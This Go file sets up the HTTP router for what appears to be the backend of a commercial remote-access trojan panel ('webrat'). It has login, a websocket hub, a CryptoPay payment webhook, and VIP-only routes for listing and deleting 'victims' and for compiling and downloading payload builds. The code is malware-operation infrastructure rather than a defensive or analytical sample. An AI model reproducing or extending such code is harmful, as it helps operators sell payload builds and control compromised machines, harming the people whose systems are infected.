package httpapi

import (
	"net/http"

	"github.com/go-chi/chi/v5"

	"webrat-go-api/internal/auth"
	"webrat-go-api/internal/storage"
	"webrat-go-api/internal/ws"
)

type Server struct {
	db   *storage.DB
	auth *auth.Service
	wsHub *ws.Hub
}

func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
	s := &Server{db: db, auth: auth.New(db), wsHub: hub}

	r := chi.NewRouter()

	r.Use(s.ensureCSRF)

	r.Get("/api/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})

	r.Post("/login", s.handleLogin)
	r.Get("/me", s.requireAPIAuth(s.handleMe))
	r.Post("/logout", s.handleLogout)

	r.Get("/ws", s.handleWS)
	r.Get("/api/ws", s.handleWS)

	r.HandleFunc("/api/cryptopay/webhook", s.handleCryptoPayWebhook)

	r.Route("/api", func(r chi.Router) {
		r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
		r.Get("/victims", s.requireVIP(s.handleGetVictims))
		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
		r.Post("/victims", s.requireVIP(s.handleDeleteVictim))
		r.Post("/compile-go", s.requireVIP(s.handleCompileGo))
		r.Get("/compile-status", s.requireVIP(s.handleCompileStatus))
		r.Get("/compile-download", s.requireVIP(s.handleCompileDownload))
	})

	return r
}
